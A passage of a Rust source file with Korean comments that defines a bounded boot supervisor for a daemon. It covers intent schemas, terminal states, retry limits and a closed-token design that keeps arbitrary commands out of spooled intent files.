//! (U-23) **부트 감독자** — 부트를 단명 훅 자식에서 떼어내 **장수 데몬이 낳게** 한다.
//!
//! ## 근본원인 R3 — 감독자가 없다
//! 지금의 부트는 **단발 체인**이다. `UserPromptSubmit` 훅이 `javis_bootstrap.py` 를
//! `setsid`→`nohup`→`&` 폴백으로 백그라운드에 던지고 즉시 사라진다. 그 뒤를 봐 주는 주체가
//! 아무도 없다:
//!   · 훅이 등록 timeout 으로 잘리면(하네스 group-kill) 부트도 함께 죽는다 —
//!     **Windows 는 `setsid` 가 아예 없어**(실측 WIN-6 `runtime\git\usr\bin\setsid.exe` 부재)
//!     `nohup` 분기가 pgid 를 분리하지 못하고 정확히 이 경로로 죽는다. 맥은 멀쩡하고 윈도우
//!     설치본만 깨지는 그 반복 사고의 한 갈래다.
//!   · 발화가 실패해도 **재시도가 없다**. 훅은 이미 종료됐고 다시 부를 사람이 없다.
//!
//! 이 모듈이 그 빈자리를 만든다: **인텐트(intent)를 스풀에 적어 두면, 데몬이 자기 cadence 로
//! 그것을 집어 부트 체인을 낳는다.** 데몬은 훅의 프로세스 그룹 밖에 있으므로 훅이 잘려도
//! 부트는 산다.
//!
//! ## 이 저장소의 제1 계약 — 오살이 오탐보다 훨씬 위험하다
//! 그래서 이 감독자는 **아무것도 죽이지 않는다.** 좌석 close·프로세스 kill·에이전트 재기동은
//! 이 파일에 **한 줄도 없고**, 그 부재를 검체(`H-BOOT-SUP-1`)가 소스 핀으로 못박는다.
//! 감독자가 할 수 있는 일은 "없는 것을 낳는 것" 하나뿐이며, 그것조차 유계다(아래).
//!
//! ## 폭주(치명위험 ①) 차단 — 유계는 **낳는 것**과 **말하는 것** 둘 다에 건다
//!
//! ### 낳는 것(프로세스)
//!   ① **시도 상한** [`MAX_ATTEMPTS`] — 인텐트 1건이 낳을 수 있는 프로세스는 최대 3개다.
//!   ② **쿨다운** [`RETRY_COOLDOWN_SECS`] — 연속 시도 사이 최소 간격(선형 백오프).
//!   ③ **메모리측 예산** — 파일 쓰기가 실패해 `attempts` 가 영원히 0 으로 남아도(읽기전용
//!      스풀·디스크 만실), 태스크 로컬 예산이 같은 유계를 **혼자서도** 성립시킨다
//!      (`effective_attempts` = 파일 ∪ 메모리의 **최댓값**). 디스크가 거짓말해도 폭주는 없다.
//!      ★그 예산 맵의 상한 집행은 **`clear()` 가 아니다**(`SupState::budget` · `tick_in`):
//!      통째로 비우면 ③이 무너지는데, ③이 필요한 상황이 정확히 '디스크 축이 이미 무너진'
//!      상황이라 **두 축이 동시에** 사라진다. 그래서 스풀에 없는 항목만 LRU 로 솎고,
//!      그래도 넘치면 **낳는 것을 멈춘다**(유계가 liveness 보다 앞이다).
//!   여기에 틱당 디스패치 상한([`MAX_DISPATCH_PER_TICK`])이 더해져, 스풀에 1만 건이 쏟아져도
//!   한 틱이 낳는 프로세스는 2개를 넘지 않는다.
//!
//! ### 말하는 것(이벤트)
//!   ④ **음성 캐시**(`SupState::undeletable` · `remove_and_gate`) — 스풀 항목 삭제가
//!      실패하면 그 항목은 **매 틱 같은 판정으로 다시 올라온다**. 발행을 삭제 결과와 묶지
//!      않으면 지워지지 않는 파일 하나가 3초마다 영구히 이벤트를 낸다. 그래서 (경로, 사유)당
//!      정확히 1건으로 접고, 회수는 **파일이 실제로 사라졌을 때만** 한다.
//!      주 경로는 Windows다: 읽기전용 속성·다른 프로세스가 연 파일에서 `remove_file` 이
//!      실패하고, `ensure_spool` 의 권한 재강제는 `#[cfg(unix)]` 라 거기서는 무력하다
//!      (`remove_spool_file` 이 속성 1회 해제로 그 한 겹을 만든다).
//!
//! ### 스캔 두 축 — 상한은 두 개이고 **독립**이다
//!   [`MAX_SCAN_ENTRIES`] 는 한 틱이 **판정**할 인텐트 수, [`MAX_GC_ENTRIES`] 는 한 틱이
//!   **검사**할 엔트리 수다. 하나로 합치면 정렬 앞쪽이 차 있는 동안 뒤쪽 쓰레기가 영원히
//!   검사되지 않아 스풀이 무한 성장한다. 상한 뒤쪽의 기아는 **회전 커서**가 닫는다
//!   (`SupState::cursor` · `scan_spool`).
//!
//! ## watchdog 틱을 절대 막지 않는다 (설계서 U-23 게이트: "틱 정지 0")
//! `governance::spawn_watchdog` 의 틱 본문은 **동기 클로저**(`AssertUnwindSafe(|| { … })`)이고
//! 그 태스크에서 `.await` 하는 것은 `tokio::time::sleep` **하나뿐**이다. 즉 틱 본문에 무엇을
//! 넣든 그것은 **블로킹**이며, 부트 1회(수십 초)를 거기 얹으면 큐 배달·승인 격상·데드맨·회수가
//! 그 시간만큼 통째로 정지한다(치명위험 ②③). 그래서 감독자는 **별도 `tokio::spawn` + 자기
//! cadence**([`SUPERVISOR_INTERVAL_SECS`])다. 이 계약은 `H-TICK-ALIVE` 가 소스 핀으로 지킨다.
//!
//! ## 인텐트에는 **명령 문자열이 없다**
//! 스풀은 상태 디렉터리 안의 평범한 파일이다. 거기 적힌 값이 곧 실행 명령이면, 그 디렉터리에
//! 쓸 수 있는 누구든 데몬 권한으로 임의 명령을 얻는다. 그래서 인텐트가 나르는 것은 **닫힌
//! enum 의 토큰**([`BootAction`]) 하나이고, 미지 토큰은 **실행되지 않고 폐기**된다
//! (`Disposition::Retire("unknown_action")`). 합성 표본(셸 명령을 action 에 넣은 인텐트)이
//! 실행되지 않는지를 단위테스트가 직접 시험한다.
//!
//! ## 롤백 (규약 6: 노브는 사고 순간에 **하나**여야 한다)
//! `CYS_BOOT_GATES=0` **마스터 스위치 하나**로 감독자가 기동하지 않는다. 축 단위 조정이
//! 필요하면 `CYS_BOOT_SUPERVISOR=0`([`ENV_SUPERVISOR`])이 있지만, 사고 순간에 사람이 쥐는
//! 손잡이는 마스터 하나다(`lib.rs ENV_BOOT_GATES` 의 규율 — 축마다 노브를 따로 두고 나중에
//! 합치는 순서는 BLOCK-3 에서 이미 실패했다).
//!
//! ## 생산자 (P2 — U-24 착지)
//! 인텐트의 생산자는 `handlers.rs` 의 **`boot.enqueue` RPC arm** 하나다(훅이 게이트 사슬 통과
//! 후 `cys boot-intent` 로 부른다). 정상 경로에서 스풀의 유일한 writer 는 **데몬 자신**
//! (`boot.enqueue`→[`enqueue`]) 이므로 writer/reader 스키마 버전은 항상 일치한다.
//!
//! ## 재시도의 **정직한 의미론** — 재시도 = **스폰 실패 한정**
//! 감독자는 자식 exit 을 관측하지 않는다(핸들 즉시 드롭 · [`run_ensure_team`]). 따라서
//! '스폰 성공 = 인텐트 제거'이고, exit 11(싱글플라이트 skip)도 exit 10(session_error)도
//! 여기서는 '성공'으로 접힌다. **부트 실패** 계급의 재실행 주체는 여전히 §0-A(P0-3) 가
//! 유일하다 — 이 감독자가 그것을 대체한다고 서술하면 허위다(2차 성찰 P2-3 판정).

use crate::state::{now_epoch, state_dir, Daemon};
use serde_json::json;
use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::sync::atomic::Ordering;
use std::sync::Arc;
use std::time::Duration;

// ══════════════════════════════════════════════════════════════════════════════
// 계약 상수 — 값의 정의처는 여기 하나다.
// ══════════════════════════════════════════════════════════════════════════════

/// 인텐트 **페이로드** 스키마 버전. 다르면 실행하지 않고 폐기한다(전방 호환을 침묵으로 접지
/// 않는다 — 구 데몬이 신 인텐트를 자기 방식으로 해석하는 것이 가장 나쁜 귀결이다).
///
/// **v2 (P2)**: `decl_origin`(닫힌 토큰)·`claim{rc,at}`(데이터) 추가. 다운그레이드 스큐에서
/// 구 감독자(v1)는 신 인텐트를 `schema_mismatch` 로 **시끄럽게 폐기**한다(기존 계약 그대로 ·
/// R3-P2-1). 미지 필드는 무시하고 **필수 필드 부재만** 폐기한다([`BootIntent::from_str`]).
pub const INTENT_SCHEMA_V: u64 = 3;

/// (부트 v2 · 명세 §2-5) **승격 판독** 대상인 구 스키마. 구 데몬이 남긴 잔여 인텐트는
/// 폐기가 아니라 3 으로 승격해 읽는다(`executor` 는 빈 값, `state` 는 pending, `generation`
/// 은 0 으로 기본값 채움) — 업그레이드 순간에 대기 중이던 오너 선언을 죽이지 않기 위해서다.
/// 반대 방향(미래 스키마·v1 이하)은 여전히 fail-closed 폐기다.
pub const INTENT_SCHEMA_V_LEGACY: u64 = 2;

/// (부트 v2 · 명세 §2-5) GUI ▶버튼 유래. `operator_token` 이 데몬 발급값과 일치할 때만
/// 인정된다 — 훅과 달리 GUI 는 `surface_id` 를 **명시**할 수 있고 그 인가 근거가 이 토큰이다
/// (`handlers::operator_token_ok` · feed.reply 면제와 같은 신뢰 계급).
pub const DECL_ORIGIN_GUI_OPERATOR: &str = "gui-operator";

/// 인텐트를 실행할 주체. 롤백 스위치 값의 **스냅샷**이며, 전환 중에도 인텐트는 태어날 때의
/// 결정대로 완주한다(명세 §5).
pub const EXECUTOR_RUNNER: &str = "runner";
/// 구 경로 — `javis_bootstrap.py` 직접 spawn.
pub const EXECUTOR_PYTHON: &str = "python";

/// terminal 로 닫힌 인텐트 파일에 붙는 접미사. GC 는 **이것만** 지운다.
///
/// ★왜 즉시 rename 인가(시뮬 T1-3 — 이 한 줄이 없으면 G1 이 깨진다): 스풀 파일명이
/// `<decl_id>.json` 이고 terminal 파일이 GC 될 때까지 남아 있으면, 같은 프롬프트를 오너가
/// **실패 후 다시** 쳤을 때 `O_EXCL` 이 실패해 `dedup` 으로 접힌다 = **정당한 재선언이
/// 삼켜진다**. terminal 전이 시점에 이름을 바꿔 두면 새 선언은 언제나 새 파일이다.
pub const DONE_SUFFIX: &str = ".done";

/// (P2 · v2) `decl_origin` 이 나를 수 있는 **유일하게 인정되는 토큰**. 훅의 기계유래 게이트
/// (`javis_mission machine-origin`)가 human 판정을 완주했을 때만 이 값이 실린다 — 판별의
/// 소유자는 여전히 훅/javis_mission 이고(P2-5 · 게이트는 훅에 남는다), 이 필드는 **게이트
/// 통과 사실의 전달**이지 판정의 이동이 아니다. 미지값은 인정이 아니라 폐기다
/// (`Disposition::Retire("unknown_decl_origin")` — 닫힌 토큰 계약).
pub const DECL_ORIGIN_HOOK_HUMAN: &str = "hook-human";

/// 스풀 디렉터리 이름. 부모는 `state_dir(socket)` 이므로 **부서 격리를 자동 상속**한다
/// (Windows 는 `%LOCALAPPDATA%\cys[\<slug>]`, unix 는 소켓과 같은 디렉터리).
const SPOOL_DIR_NAME: &str = "boot-intents";

/// 감독자 **자기 cadence**(초). watchdog(5초)과 **일부러 다른 값**이다 — 같으면 두 태스크가
/// 매 틱 같은 순간에 깨어나 프로세스 표·디스크를 동시에 두드린다(lockstep).
const SUPERVISOR_INTERVAL_SECS: u64 = 3;

/// 인텐트 1건이 낳을 수 있는 **최대 시도 수**(폭주 차단 ①). 이 값을 넘으면 재시도가 아니라
/// **폐기**다 — 무한 재시도는 이 저장소가 이미 값을 치른 실패 양식이다.
pub const MAX_ATTEMPTS: u32 = 3;

/// 연속 시도 사이 최소 간격(초 · 폭주 차단 ②). 실제 대기는 `쿨다운 × 시도횟수`(선형 백오프).
pub const RETRY_COOLDOWN_SECS: f64 = 30.0;

/// 인텐트 수명(초). 이보다 오래된 것은 실행하지 않고 폐기한다 — 30분 전 프롬프트가 지금
/// 팀을 기동시키는 것은 사용자가 기대한 인과가 아니다.
pub const INTENT_MAX_AGE_SECS: f64 = 1800.0;

/// 한 틱이 **본문을 읽어 판정하는** 스풀 엔트리 상한. 스풀이 홍수여도 틱 길이는 유계다.
const MAX_SCAN_ENTRIES: usize = 64;

/// 한 틱이 **GC 검사**(mtime metadata)하는 스풀 엔트리 상한 — 판정 상한과 **독립 축**이다.
///
/// 왜 나눴는가: 두 축이 같은 상한을 공유하면, 정렬 앞쪽 64건이 살아있는(혹은 지워지지 않는)
/// 인텐트로 차 있는 동안 **그 뒤의 쓰레기는 영원히 검사되지 않는다** — 스풀이 무한 성장한다.
/// 상한 자체는 남기되(틱 길이는 유계여야 한다) 회전 커서가 기아를 닫는다(`scan_spool`).
const MAX_GC_ENTRIES: usize = 256;

/// 지우지 못한 스풀 항목의 **음성 캐시** 상한. 캐시가 차면 새 키에 대해 **침묵**한다 —
/// 캐시를 비우는 것은 3초마다의 이벤트 폭주를 다시 여는 것과 같다(유계 파기).
const MAX_UNDELETABLE: usize = 256;

/// 한 틱이 **낳는** 프로세스 상한. 스캔 상한과 별개 축이다(64건을 읽어도 2건만 낳는다).
const MAX_DISPATCH_PER_TICK: usize = 2;

/// (★R2) 한 틱이 **pane 에 주입하는** 무스폰 통보 상한. 폐기(`Disposition::Retire`)는 스캔
/// 상한(64)까지 갈 수 있어서 디스패치 상한이 막아 주지 않는다 — kill-switch pause 가 길게
/// 유지된 뒤 재개하는 순간 다수가 한꺼번에 `expired` 로 접히면 선언 pane 이 주입 홍수를 맞는다.
///
/// ★상한이 걸리는 것은 **pane 채널 하나뿐**이다: feed 항목과 버스 이벤트는 무조건 나간다
/// (그쪽은 스캔 상한이 이미 유계이고, '조용히 사라지는 갈래 0' 이 이 수리의 목적이다).
/// 잘림 자체는 `boot_supervisor.notify_capped` 로 1회 가청화한다.
/// ★폐기(삭제)는 통보 예산과 **무관하게** 계속한다 — 쓰레기·적대 인텐트의 GC 를 통보 예산에
/// 묶으면 스풀이 줄지 않는다(그 결합은 R2 수리 도중 실측으로 기각됐다).
const MAX_RETIRE_NOTIFY_PER_TICK: usize = 2;

/// 태스크 로컬 예산 맵의 상한(맵 3종 방어 ①). 넘으면 통째로 비우고 이벤트를 남긴다 —
/// 24/365 데몬에서 맵이 조용히 자라는 것은 이 저장소의 알려진 누수 양식이다.
const MAX_TRACKED: usize = 128;

/// 감독자 **축 노브**. 사고 순간의 손잡이는 마스터(`CYS_BOOT_GATES=0`) 하나이고, 이것은
/// 축 단위 조정용이다.
pub const ENV_SUPERVISOR: &str = "CYS_BOOT_SUPERVISOR";

/// (부트 v2 · 명세 §5) 부트 v2 경로의 **롤백 스위치**. 기본은 켜짐이고 `0` 만 끔이다.
///
/// ★스위치의 단일 진실은 **데몬**이다(`status --json`.`boot_v2_enabled` 로 노출). 훅·GUI·
/// 감독자가 각자 env 를 읽으면 세 주체의 판단이 갈릴 수 있고, 사고 순간에 "누가 어느 값을
/// 봤는가" 를 재구성하는 것은 거의 불가능하다. 그래서 판독은 데몬 1회이고 나머지는 물어본다.
pub const ENV_BOOT_V2: &str = "CYS_BOOT_V2";

/// [`ENV_BOOT_V2`] 판독(순수). `Some("0")` 만 끔 — 미설정·빈값·그 외는 켜짐이다.
/// (`supervisor_off_from` 과 **반대 극성**인 점에 주의: 그쪽은 "꺼짐인가", 이쪽은 "켜짐인가".)
pub fn boot_v2_enabled_from(env_val: Option<&str>) -> bool {
    env_val != Some("0")
}

// ══════════════════════════════════════════════════════════════════════════════
// 순수 코어 — 데몬 상태도 디스크도 읽지 않는다(진리표 대상).
// ══════════════════════════════════════════════════════════════════════════════

/// 감독자가 꺼졌는가 — **마스터 스위치에 접힌** 순수 판정.
///
/// `cys::boot_gates_master_off_from` 을 **재사용**한다(규율을 두 벌로 쓰지 않는다).
///
/// ## ★기본값의 현행 의미(R2 · 2026-08-26 정정 — 사고 순간의 오판 유도 제거)
/// 종전 서술은 "생산자가 없는 지금은 켜져 있어도 스풀이 비어 있어 종전 동작과 한 글자도
/// 다르지 않다 = 기본값이 곧 종전 동작" 이었다. 이 캠페인(P2)이 생산자를 배선하면서 **거짓이
/// 됐다**: 생산자는 `boot.enqueue` RPC arm 하나이고(모듈 헤더 '생산자' 절), 훅 frontdoor 가
/// 게이트 사슬을 통과해 인텐트를 남기면 데몬이 **실제로 부트 체인을 스폰한다** — 기본값
/// (미설정)은 감독자 **가동**이고 행동 변경이 있다.
/// 롤백은 `CYS_BOOT_GATES=0`(축 단위는 `CYS_BOOT_SUPERVISOR=0`)이 유일 수단이며, 그때
/// `boot.enqueue` 는 `supervisor_off` 를 돌려 훅이 **종전 spawn 폴백**을 탄다(무손실 강등).
/// 하필 롤백 노브의 정의처에 붙은 낡은 문장은 사고 순간에 '기본값은 무해하니 서두를 것 없다'는
/// 정반대 결론을 부른다 — 그래서 이 절은 사실과 함께 유지된다.
pub fn supervisor_off_from(master_env: Option<&str>, own_env: Option<&str>) -> bool {
    cys::boot_gates_master_off_from(master_env) || own_env == Some("0")
}

/// 감독자가 할 수 있는 일의 **닫힌 집합**. 인텐트는 이 토큰만 나르며, **명령 문자열은 절대
/// 나르지 않는다**(모듈 헤더 '명령 문자열이 없다' 절).
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum BootAction {
    /// 부트 체인(`<pack>/bin/javis_bootstrap.py`)을 **데몬의 자식으로** 낳는다.
    /// 멱등성은 그 스크립트가 이미 소유한 싱글플라이트 락이 보증한다(패자 = exit 11) —
    /// 세 런처(훅·`cys boot`·감독자)가 동시에 들어와도 실제 부트는 하나다.
    EnsureTeam,
}

impl BootAction {
    /// 와이어 토큰. 파일에 적히는 값이며 이 철자가 곧 계약이다.
    pub fn as_str(self) -> &'static str {
        match self {
            BootAction::EnsureTeam => "ensure-team",
        }
    }

    /// 와이어 토큰 → enum. **미지 토큰은 `None`** 이고, 호출부는 그것을 실행이 아니라
    /// 폐기로 접는다(fail-closed).
    pub fn parse(token: &str) -> Option<Self> {
        match token {
            "ensure-team" => Some(BootAction::EnsureTeam),
            _ => None,
        }
    }
}

/// 인텐트의 **종착 종류**(명세 §3-2 단일 enum). 감독자의 구 `Retire(...)` 사유와 러너의
/// exit 코드가 **전부 이 표로 합류**한다 — 종착이 두 어휘로 갈려 있으면 "왜 안 떴나" 를 한
/// 곳에서 답할 수 없다(G2 완주 결정론).
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum TerminalKind {
    /// ⑤ READY.
    Completed,
    /// READY 이나 리뷰어 ack 미확인 — **정상 종착**이되 리뷰 게이트만 닫는다(가정 A).
    CompletedDegraded,
    /// claim 정당 거부(러너 rc 7) — 다른 master 가 살아 있다.
    Declined,
    /// claim 컨텍스트 오류(rc 10) — 좌석 소실·데몬 부재.
    SessionError,
    /// 전제 붕괴로 중단(master_gone · busy_other_executor · resource_hard · lease_fenced ·
    /// version_incompatible · 구 Retire 사유 전반).
    Aborted,
    /// 러너 예외.
    Crashed,
    /// 같은 좌석에 진행 중 인텐트가 있는데 새 선언이 왔다 — 기록 1 · 실행 0.
    Superseded,
    /// 감독자 수명 만료([`INTENT_MAX_AGE_SECS`]).
    Expired,
    /// 감독자 시도 상한([`MAX_ATTEMPTS`]).
    AttemptsExhausted,
    /// 레인 락 패자(rc 11) — 정상이며 처방이 없다.
    SkippedInflight,
    /// 인텐트 파일 JSON 파싱 실패.
    StateUnreadable,
}

impl TerminalKind {
    /// 와이어 철자. 파일·이벤트에 적히는 값이며 이 철자가 곧 계약이다.
    pub fn as_str(self) -> &'static str {
        match self {
            TerminalKind::Completed => "completed",
            TerminalKind::CompletedDegraded => "completed_degraded",
            TerminalKind::Declined => "declined",
            TerminalKind::SessionError => "session_error",
            TerminalKind::Aborted => "aborted",
            TerminalKind::Crashed => "crashed",
            TerminalKind::Superseded => "superseded",
            TerminalKind::Expired => "expired",
            TerminalKind::AttemptsExhausted => "attempts_exhausted",
            TerminalKind::SkippedInflight => "skipped_inflight",
            TerminalKind::StateUnreadable => "state_unreadable",
        }
    }

    /// 와이어 철자 → enum. **미지 토큰은 `None`** 이다(fail-closed — 조용한 기본값 금지).
    pub fn parse(token: &str) -> Option<Self> {
        Some(match token {
            "completed" => TerminalKind::Completed,
            "completed_degraded" => TerminalKind::CompletedDegraded,
            "declined" => TerminalKind::Declined,
            "session_error" => TerminalKind::SessionError,
            "aborted" => TerminalKind::Aborted,
            "crashed" => TerminalKind::Crashed,
            "superseded" => TerminalKind::Superseded,
            "expired" => TerminalKind::Expired,
            "attempts_exhausted" => TerminalKind::AttemptsExhausted,
            "skipped_inflight" => TerminalKind::SkippedInflight,
            "state_unreadable" => TerminalKind::StateUnreadable,
            _ => return None,
        })
    }

    /// 전 종착 열거 — 검체가 "빠짐 없음"(H-TERMINAL-1 열거 파리티)을 이것으로 잰다.
    pub const ALL: [TerminalKind; 11] = [
        TerminalKind::Completed,
        TerminalKind::CompletedDegraded,
        TerminalKind::Declined,
        TerminalKind::SessionError,
        TerminalKind::Aborted,
        TerminalKind::Crashed,
        TerminalKind::Superseded,
        TerminalKind::Expired,
        TerminalKind::AttemptsExhausted,
        TerminalKind::SkippedInflight,
        TerminalKind::StateUnreadable,
    ];

    /// 구 `Disposition::Retire(why)` 문자열 → 종착 종류. 감독자의 종전 폐기 사유를 새 대수로
    /// **합류**시키는 유일 지점이다(사유 문자열 자체는 이벤트 호환을 위해 그대로 보존된다).
    pub fn from_retire_reason(why: &str) -> TerminalKind {
        match why {
            "expired" => TerminalKind::Expired,
            "attempts_exhausted" => TerminalKind::AttemptsExhausted,
            // schema_mismatch·unknown_action·unknown_decl_origin·claim_stale·no_surface 는
            // 전부 "전제가 무너져 실행하지 않는다" = aborted 다(사유는 reason 이 나른다).
            _ => TerminalKind::Aborted,
        }
    }
}

/// 종착 1건 — 종류·사유·처방. `remedy` 는 **사람이 읽고 바로 실행할 한 줄**이다(빈 문자열 =
/// 처방 불요, 예: `skipped_inflight` 는 정상 경로다).
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Terminal {
    pub kind: TerminalKind,
    pub reason: String,
    pub remedy: String,
}

impl Terminal {
    pub fn new(kind: TerminalKind, reason: &str, remedy: &str) -> Self {
        Terminal { kind, reason: reason.to_string(), remedy: remedy.to_string() }
    }
    fn to_value(&self) -> serde_json::Value {
        json!({"kind": self.kind.as_str(), "reason": self.reason, "remedy": self.remedy})
    }
    fn from_value(v: &serde_json::Value) -> Option<Self> {
        Some(Terminal {
            kind: TerminalKind::parse(v.get("kind")?.as_str()?)?,
            reason: v.get("reason").and_then(|x| x.as_str()).unwrap_or_default().to_string(),
            remedy: v.get("remedy").and_then(|x| x.as_str()).unwrap_or_default().to_string(),
        })
    }
}

/// 인텐트 수명 상태(명세 §2-5 schema 3). 종전에는 "파일이 있으면 대기 / 지우면 끝" 이라
/// **실행 중**이라는 상태가 표현되지 않았고, 그래서 재개가 "처음부터"밖에 될 수 없었다.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum IntentState {
    Pending,
    Running,
    Terminal,
}

impl IntentState {
    pub fn as_str(self) -> &'static str {
        match self {
            IntentState::Pending => "pending",
            IntentState::Running => "running",
            IntentState::Terminal => "terminal",
        }
    }
    /// 미지 토큰은 `None` — 구 파일(필드 부재)은 호출부가 `Pending` 으로 승격한다.
    pub fn parse(token: &str) -> Option<Self> {
        Some(match token {
            "pending" => IntentState::Pending,
            "running" => IntentState::Running,
            "terminal" => IntentState::Terminal,
            _ => return None,
        })
    }
}

/// 인텐트 1건에 대한 이번 틱의 **귀결**.
#[derive(Clone, Debug, PartialEq)]
pub enum Disposition {
    /// 지금 실행한다.
    Run(BootAction),
    /// 아직 이르다 — `until` 까지 기다린다(파일은 그대로 둔다).
    Wait { until: f64 },
    /// 실행하지 않고 폐기한다. 문자열은 사유(이벤트 페이로드로 나간다).
    Retire(&'static str),
}

/// 스풀에 적히는 인텐트. `action_token` 이 `String` 인 것은 의도적이다 — 미지 토큰을
/// **파싱 단계에서 잃지 않고** 폐기 사유·이벤트에 실어 보내야 무음 실패가 아니다.
#[derive(Clone, Debug, PartialEq)]
pub struct BootIntent {
    /// 스풀 파일명(확장자 제외). `sanitize_id` 를 통과한 값만 존재한다.
    pub id: String,
    /// 페이로드 스키마 버전.
    pub v: u64,
    /// 행위 토큰(원문 그대로).
    pub action_token: String,
    /// 레인 소켓 경로. 빈 값이면 감독자 자신의 소켓을 쓴다.
    pub lane: String,
    /// 이 인텐트를 낳은 좌석(있으면). 원장 기록의 surface 축이 된다.
    pub surface_id: Option<u64>,
    /// 생성 시각(epoch 초).
    pub created_at: f64,
    /// 지금까지의 시도 횟수(디스크측 예산).
    pub attempts: u32,
    /// 다음 시도 가능 시각(epoch 초).
    pub next_attempt_at: f64,
    /// 생성 사유(진단 전용 — 판정에 쓰이지 않는다).
    pub reason: String,
    /// (v2) 선언 유래 — 닫힌 토큰 [`DECL_ORIGIN_HOOK_HUMAN`] 만 인정, 빈 값 = 부재.
    /// **데이터 필드**다: 명령이 아니고, 부트 자식의 `CYS_DECL_ORIGIN` env 로만 릴레이된다.
    pub decl_origin: String,
    /// (v2) 훅 선행 claim 의 rc 릴레이(데이터 — 디스패치 시점 판정은 [`run_ensure_team`] 의
    /// **레지스트리 재실측**이 한다. 타임스탬프 이월 금지 · R3-P2-5).
    pub claim_rc: Option<i64>,
    /// (v2) 훅 선행 claim 시각(epoch 초 · 진단 전용 — 위와 같은 이유로 판정에 쓰지 않는다).
    pub claim_at: Option<f64>,
    /// (v3 · 명세 §2-5) **선언 id** — `sha256(lane | surface_id | session_id |
    /// digest_normalized(prompt))[:32]`. 데몬이 계산하며(클라이언트는 재료만 준다) 스풀
    /// **파일명**이 곧 이 값이다. 같은 선언 이벤트의 재전송은 같은 id 라 `O_EXCL` 이 dedup
    /// 으로 접는다 — 종전의 '유일 카운터 id' 는 재전송과 재선언을 구별하지 못했다.
    pub decl_id: String,
    /// (v3) 실행 주체 스냅샷 — [`EXECUTOR_RUNNER`]·[`EXECUTOR_PYTHON`]. 롤백 스위치가 도중에
    /// 뒤집혀도 인텐트는 **태어날 때의 결정대로** 완주한다(명세 §5).
    pub executor: String,
    /// (v3) lease 세대. 디스패치마다 +1 되며 side-effect RPC 의 CAS 근거다(명세 §2-6).
    pub generation: u32,
    /// (v3) 수명 상태.
    pub state: IntentState,
    /// (v3) 종착(있으면). `state == Terminal` 일 때만 채워진다.
    pub terminal: Option<Terminal>,
}

impl BootIntent {
    fn to_value(&self) -> serde_json::Value {
        json!({
            "v": self.v,
            "action": self.action_token,
            "lane": self.lane,
            "surface_id": self.surface_id,
            "created_at": self.created_at,
            "attempts": self.attempts,
            "next_attempt_at": self.next_attempt_at,
            "reason": self.reason,
            "decl_origin": self.decl_origin,
            "claim": {"rc": self.claim_rc, "at": self.claim_at},
            // (v3) 추가-only — 구 판독자는 미지 키를 무시한다(`from_str` 은 알려진 키만 본다).
            "decl_id": self.decl_id,
            "executor": self.executor,
            "generation": self.generation,
            "state": self.state.as_str(),
            "terminal": self.terminal.as_ref().map(|t| t.to_value()),
        })
    }

    /// 파일 본문 → 인텐트. **형상이 틀리면 `None`** 이고 호출부는 폐기한다(조용한 기본값
    /// 채우기 금지 — 기본값으로 채우면 깨진 인텐트가 정상처럼 실행된다).
    fn from_str(id: &str, body: &str) -> Option<Self> {
        let v: serde_json::Value = serde_json::from_str(body).ok()?;
        let obj = v.as_object()?;
        Some(BootIntent {
            id: id.to_string(),
            v: obj.get("v")?.as_u64()?,
            action_token: obj.get("action")?.as_str()?.to_string(),
            lane: obj
                .get("lane")
                .and_then(|x| x.as_str())
                .unwrap_or_default()
                .to_string(),
            surface_id: obj.get("surface_id").and_then(|x| x.as_u64()),
            created_at: obj.get("created_at").and_then(|x| x.as_f64()).unwrap_or(0.0),
            // 폭 변환은 **클램프**다(governance.rs `clamp_env_u32` 와 같은 규율) — `as` 는
            // wrap 이라 거대 `attempts` 가 0·1 로 되접히면 예산 축이 통째로 뒤집힌다.
            // 거대값 → `u32::MAX` → `attempts_exhausted` 폐기 = 보수적 방향.
            attempts: u32::try_from(obj.get("attempts").and_then(|x| x.as_u64()).unwrap_or(0))
                .unwrap_or(u32::MAX),
            next_attempt_at: obj
                .get("next_attempt_at")
                .and_then(|x| x.as_f64())
                .unwrap_or(0.0),
            reason: obj
                .get("reason")
                .and_then(|x| x.as_str())
                .unwrap_or_default()
                .to_string(),
            // (v2) 알려진 키만 판독 — 부재는 빈 값/None(구 v1 파일 하위호환 판독. 단 v1 은
            // decide() 의 버전 판정에서 어차피 schema_mismatch 로 폐기된다).
            decl_origin: obj
                .get("decl_origin")
                .and_then(|x| x.as_str())
                .unwrap_or_default()
                .to_string(),
            claim_rc: obj.get("claim").and_then(|c| c.get("rc")).and_then(|x| x.as_i64()),
            claim_at: obj.get("claim").and_then(|c| c.get("at")).and_then(|x| x.as_f64()),
            // ── (v3) 승격 판독(명세 §2-5 · §5) ────────────────────────────────────
            // 구 스키마(v2) 파일에는 이 키들이 없다. **폐기가 아니라 기본값 승격**이다 —
            // 업그레이드 순간에 대기 중이던 오너 선언을 죽이지 않기 위해서다.
            //   · decl_id 부재 → 파일명(id). 그 파일의 유일 식별자는 이름이다.
            //   · executor 부재 → 빈 값. 디스패치 시점에 감독자가 스위치 값으로 채운다
            //     (여기서 env 를 읽지 않는 이유: `from_str` 이 순수해야 진리표로 시험된다).
            //   · state 부재/미지 → pending(가장 보수적 — 실행 전으로 본다).
            //   · terminal 형상 불량 → None(있다고 거짓말하지 않는다).
            decl_id: obj.get("decl_id").and_then(|x| x.as_str())
                .filter(|x| !x.is_empty()).unwrap_or(id).to_string(),
            executor: obj.get("executor").and_then(|x| x.as_str()).unwrap_or_default().to_string(),
            generation: u32::try_from(obj.get("generation").and_then(|x| x.as_u64()).unwrap_or(0))
                .unwrap_or(u32::MAX),
            state: obj.get("state").and_then(|x| x.as_str()).and_then(IntentState::parse)
                .unwrap_or(IntentState::Pending),
            terminal: obj.get("terminal").and_then(Terminal::from_value),
        })
    }
}

/// **디스크측 예산과 메모리측 예산의 합류** — 큰 쪽이 이긴다.
///
/// 왜 필요한가: 스풀이 읽기전용이 되거나 디스크가 만실이면 `attempts` 증가가 **영원히
/// 실패**한다. 그러면 파일만 보는 판정은 매 쿨다운마다 새로 시도해 프로세스를 무한히 낳는다
/// (치명위험 ① 그 자체). 태스크 로컬 예산은 디스크가 거짓말해도 **혼자서** 유계를 성립시킨다.
pub fn effective_attempts(file_attempts: u32, mem_attempts: u32) -> u32 {
